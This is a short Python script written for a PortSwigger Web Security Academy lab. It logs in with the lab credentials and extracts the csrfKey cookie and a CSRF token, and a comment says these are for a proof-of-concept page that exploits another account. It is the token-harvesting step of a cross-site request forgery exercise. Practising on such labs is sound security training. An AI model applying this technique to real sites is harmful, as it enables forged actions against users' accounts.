import requests
import re 

def get_csrf(text):
	csrf = re.findall(r'csrf value=(.*)>', text)
	return csrf[0]	


s = requests.Session()
url = "https://0afa0058044ffc36c01e092b006100bb.web-security-academy.net/"

r1 = s.get(url + "login")
login_csrf = get_csrf(r1.text)

r2 = s.post(url + "login", data={
	"username": "wiener",
	"password": "peter",
	"csrf": login_csrf
	})


cookie = r1.headers['Set-Cookie']
print(f"csrfKey => {cookie.split(';')[0].split('=')[1]}")
wiener_csrf = get_csrf(r2.text)
print(f"csrf    => {wiener_csrf}")

# Use this csrfKey and csrf token to exploit other account
# use this results in poc_lab05.html